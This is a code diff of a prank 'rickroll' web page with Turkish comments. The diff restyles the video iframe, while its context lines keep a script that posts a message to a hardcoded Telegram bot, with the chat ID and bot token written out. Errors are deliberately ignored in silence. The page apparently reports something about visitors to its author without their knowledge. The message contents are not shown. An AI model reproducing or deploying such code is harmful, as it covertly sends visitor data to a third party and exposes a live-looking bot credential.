@@ -12,13 +12,13 @@
       align-items: center;
     }
     #rickroll {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
+      width: 640px;  /* Video genişliği */
+      height: 360px; /* Video yüksekliği */
       border: none;
-      pointer-events: none; /* Videoya tıklanmasın */
-      z-index: 9999;
+      pointer-events: none;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      background: black; /* Video arka planı */
     }
   </style>
 </head>
@@ -32,8 +32,8 @@
 
   <script>
     async function sendToTelegram(message) {
-      const chatId = "6400737507"; // Senin chat ID'in
-      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
+      const chatId = "6400737507";
+      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg";
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
       try {
@@ -69,7 +69,7 @@
 
         await sendToTelegram(message);
       } catch(e) {
-        // Sessizce hatayı yoksay
+        // Sessizce yoksay
       }
     }
 
